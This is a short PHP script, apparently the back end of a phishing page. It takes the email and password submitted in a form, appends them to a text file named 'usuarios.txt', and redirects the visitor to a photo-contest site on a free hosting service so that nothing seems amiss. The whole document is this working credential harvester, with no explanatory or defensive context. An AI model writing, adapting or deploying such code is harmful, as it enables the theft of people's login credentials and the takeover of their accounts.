<?php
file_put_contents("usuarios.txt", "Correo: " .$_POST['email'] . "Contraseñas: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://concurso-fotos2020.000webhostapp.com/');
exit();
